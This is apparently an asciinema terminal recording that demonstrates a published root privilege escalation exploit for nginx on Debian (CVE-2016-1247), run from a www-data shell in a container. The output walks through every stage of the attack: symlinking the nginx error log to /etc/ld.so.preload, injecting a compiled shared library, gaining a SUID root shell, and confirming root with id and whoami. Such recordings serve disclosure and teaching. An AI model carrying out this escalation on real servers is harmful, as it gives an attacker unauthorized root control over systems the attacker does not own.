{
  "title": null,
  "width": 96,
  "duration": 26.755524,
  "env": {
    "SHELL": "/bin/bash",
    "TERM": "xterm-256color"
  },
  "height": 25,
  "command": null,
  "version": 1,
  "stdout": [
    [
      0.036942,
      "\u001b]0;www-data@docker01: ~\u0007www-data@docker01:~$ "
    ],
    [
      0.71683,
      "i"
    ],
    [
      0.038987,
      "d"
    ],
    [
      0.170007,
      "\r\n"
    ],
    [
      0.002436,
      "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
    ],
    [
      0.00023,
      "\r\n"
    ],
    [
      0.000486,
      "\u001b]0;www-data@docker01: ~\u0007www-data@docker01:~$ "
    ],
    [
      0.575106,
      "w"
    ],
    [
      0.060803,
      "h"
    ],
    [
      0.087054,
      "o"
    ],
    [
      0.151983,
      "a"
    ],
    [
      0.125272,
      "m"
    ],
    [
      0.099858,
      "i"
    ],
    [
      0.199896,
      "\r\n"
    ],
    [
      0.001651,
      "www-data\r\n"
    ],
    [
      0.000353,
      "\u001b]0;www-data@docker01: ~\u0007www-data@docker01:~$ "
    ],
    [
      0.640168,
      "l"
    ],
    [
      0.089614,
      "s"
    ],
    [
      0.059244,
      " "
    ],
    [
      0.061985,
      "-"
    ],
    [
      0.224303,
      "l"
    ],
    [
      0.015513,
      "a"
    ],
    [
      0.149064,
      " "
    ],
    [
      0.159061,
      "/"
    ],
    [
      0.296971,
      "v"
    ],
    [
      0.103339,
      "a"
    ],
    [
      0.210844,
      "r/"
    ],
    [
      0.049021,
      "l"
    ],
    [
      0.174243,
      "o"
    ],
    [
      0.04169,
      "g"
    ],
    [
      0.152065,
      "/"
    ],
    [
      0.119211,
      "n"
    ],
    [
      0.104954,
      "g"
    ],
    [
      0.134068,
      "inx/"
    ],
    [
      0.19795,
      "e"
    ],
    [
      0.083079,
      "r"
    ],
    [
      0.110194,
      "ror.log "
    ],
    [
      0.327783,
      "\r\n"
    ],
    [
      0.001868,
      "-rw-r--r-- 1 www-data www-data 0 Mar  6 15:34 /var/log/nginx/error.log\r\n"
    ],
    [
      0.00035,
      "\u001b]0;www-data@docker01: ~\u0007www-data@docker01:~$ "
    ],
    [
      2.671502,
      "/"
    ],
    [
      0.174568,
      "t"
    ],
    [
      0.108385,
      "m"
    ],
    [
      0.04032,
      "p"
    ],
    [
      0.102117,
      "/"
    ],
    [
      0.261999,
      "d"
    ],
    [
      0.062035,
      "o"
    ],
    [
      0.108882,
      "h"
    ],
    [
      0.111449,
      ".sh "
    ],
    [
      0.467724,
      "!"
    ],
    [
      0.075542,
      "$"
    ],
    [
      3.074563,
      "\r\n"
    ],
    [
      0.000485,
      "/tmp/doh.sh /var/log/nginx/error.log"
    ],
    [
      0.000279,
      "\r\n"
    ],
    [
      0.004143,
      "\u001b[94m \r\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \r\nnginxed-root.sh (ver. 1.0)\r\n\r\nDiscovered and coded by: \r\n\r\nDawid Golunski \r\nhttps://legalhackers.com \u001b[0m\r\n"
    ],
    [
      0.001584,
      "\r\n"
    ],
    [
      4e-05,
      "[+] Starting the exploit as: "
    ],
    [
      2.1e-05,
      "\r\n"
    ],
    [
      2.5e-05,
      "\u001b[94muid=33(www-data) gid=33(www-data) groups=33(www-data)\u001b[0m"
    ],
    [
      2e-05,
      "\r\n"
    ],
    [
      0.002269,
      "\r\n"
    ],
    [
      4.2e-05,
      "[+] Compiling the privesc shared library (/tmp/privesclib.c)"
    ],
    [
      2.2e-05,
      "\r\n"
    ],
    [
      0.039837,
      "\r\n"
    ],
    [
      3.6e-05,
      "[+] Backdoor/low-priv shell installed at: "
    ],
    [
      1.9e-05,
      "\r\n"
    ],
    [
      2.2e-05,
      "-rwxrwxrwx 1 root root 1021112 Mar  6 15:34 /tmp/nginxrootsh"
    ],
    [
      1.8e-05,
      "\r\n"
    ],
    [
      0.002937,
      "\r\n"
    ],
    [
      3.6e-05,
      "[+] The server appears to be \u001b[94m(N)jinxed\u001b[0m (writable logdir) ! :) Symlink created at: "
    ],
    [
      2e-05,
      "\r\n"
    ],
    [
      2.3e-05,
      "lrwxrwxrwx 1 www-data www-data 18 Mar  6 15:34 /var/log/nginx/error.log -> /etc/ld.so.preload"
    ],
    [
      3e-05,
      "\r\n"
    ],
    [
      0.009537,
      "\r\n"
    ],
    [
      7.2e-05,
      "[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
    ],
    [
      6.013119,
      "\r\n"
    ],
    [
      0.000183,
      "[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \r\n-rw-r--r-- 1 www-data root 19 Mar  6 15:34 /etc/ld.so.preload\r\n\r\n"
    ],
    [
      4.1e-05,
      "[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload"
    ],
    [
      0.000416,
      "\r\n"
    ],
    [
      0.001467,
      "\r\n"
    ],
    [
      0.000233,
      "[+] The /etc/ld.so.preload file now contains: "
    ],
    [
      0.000119,
      "\r\n"
    ],
    [
      0.000107,
      "/tmp/privesclib.so"
    ],
    [
      2.1e-05,
      "\r\n"
    ],
    [
      0.001595,
      "\r\n"
    ],
    [
      0.000169,
      "[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!"
    ],
    [
      0.000124,
      "\r\n"
    ],
    [
      0.00561,
      "-rwsrwxrwx 1 root root 1021112 Mar  6 15:34 /tmp/nginxrootsh\r\n"
    ],
    [
      0.006377,
      "\r\n"
    ],
    [
      9.1e-05,
      "[+] Rootshell got assigned root SUID perms at: "
    ],
    [
      4.6e-05,
      "\r\n"
    ],
    [
      4.9e-05,
      "-rwsrwxrwx 1 root root 1021112 Mar  6 15:34 /tmp/nginxrootsh"
    ],
    [
      4.5e-05,
      "\r\n"
    ],
    [
      8.4e-05,
      "\r\n"
    ],
    [
      4.1e-05,
      "\u001b[94mThe server is (N)jinxed ! ;) Got root via Nginx!\u001b[0m"
    ],
    [
      5.1e-05,
      "\r\n"
    ],
    [
      0.012258,
      "\r\n"
    ],
    [
      3.5e-05,
      "[+] Spawning the rootshell /tmp/nginxrootsh now! "
    ],
    [
      1.9e-05,
      "\r\n"
    ],
    [
      2.1e-05,
      "\r\n"
    ],
    [
      0.002399,
      "nginxrootsh-4.3# "
    ],
    [
      0.951786,
      "i"
    ],
    [
      0.050336,
      "d"
    ],
    [
      0.263041,
      "\r\n"
    ],
    [
      0.001779,
      "uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)"
    ],
    [
      0.000214,
      "\r\n"
    ],
    [
      0.000327,
      "nginxrootsh-4.3# "
    ],
    [
      0.762989,
      "w"
    ],
    [
      0.108489,
      "h"
    ],
    [
      0.057122,
      "o"
    ],
    [
      0.177294,
      "a"
    ],
    [
      0.102812,
      "m"
    ],
    [
      0.12603,
      "i"
    ],
    [
      0.210893,
      "\r\n"
    ],
    [
      0.001344,
      "root\r\n"
    ],
    [
      0.000264,
      "nginxrootsh-4.3# "
    ],
    [
      1.005705,
      "#"
    ],
    [
      0.371135,
      " "
    ],
    [
      0.199774,
      "G"
    ],
    [
      0.188971,
      "a"
    ],
    [
      0.1395,
      "m"
    ],
    [
      0.113459,
      "e"
    ],
    [
      0.079254,
      " "
    ],
    [
      0.178498,
      "o"
    ],
    [
      0.080091,
      "v"
    ],
    [
      0.160449,
      "e"
    ],
    [
      0.06573,
      "r"
    ],
    [
      0.189599,
      "."
    ],
    [
      0.426237,
      "\r\n"
    ],
    [
      0.000394,
      "nginxrootsh-4.3# "
    ],
    [
      1.173946,
      "exit"
    ],
    [
      0.000378,
      "\r\n"
    ],
    [
      0.001146,
      "\r\n"
    ],
    [
      6.1e-05,
      "[+] Cleaning up..."
    ],
    [
      3.1e-05,
      "\r\n"
    ],
    [
      0.005435,
      "\r\n[+] Job done. Exiting with code 0 \r\n\r\n"
    ],
    [
      0.000707,
      "\u001b]0;www-data@docker01: ~\u0007www-data@docker01:~$ "
    ],
    [
      0.419516,
      "exit"
    ],
    [
      0.000902,
      "\r\n"
    ]
  ]
}